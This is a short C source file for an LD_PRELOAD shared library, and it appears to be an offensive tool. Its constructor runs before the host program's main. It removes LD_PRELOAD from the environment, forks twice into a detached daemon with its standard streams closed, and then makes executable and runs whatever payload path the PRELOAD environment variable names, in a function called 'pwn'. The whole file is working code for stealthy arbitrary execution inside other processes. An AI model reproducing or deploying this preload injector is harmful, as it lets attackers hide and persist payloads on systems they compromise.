/**
 * gcc preload.c -fPIC -shared -nostartfiles -m{arch} -s -o preload.so
 */
#define  _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>

void pwn(void) {
    const char *payload = getenv("PRELOAD");
	chmod(payload, 0755);
    system(payload);
}

void daemonize(void) {
	signal(SIGHUP, SIG_IGN);
	pid_t pid;

	if ((pid = fork()) < 0) {
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        exit(EXIT_SUCCESS); // Parent exits
    }
	if ((pid = fork()) < 0) {
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        exit(EXIT_SUCCESS); // Parent exits
    }

	setsid(); // Creates a new session, sets the process group ID to the session ID, and makes the process the session leader.
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}
/** __attribute__ ((__constructor__)) is a GCC extension that specifies that the function preloadme should be executed before the main function starts. In other words, it's a way to run code early in the program's lifecycle.
 */
__attribute__ ((__constructor__)) void preloadme(void) {
  unsetenv("LD_PRELOAD");
  daemonize();
  pwn();
  unsetenv("GS_ARGS");
}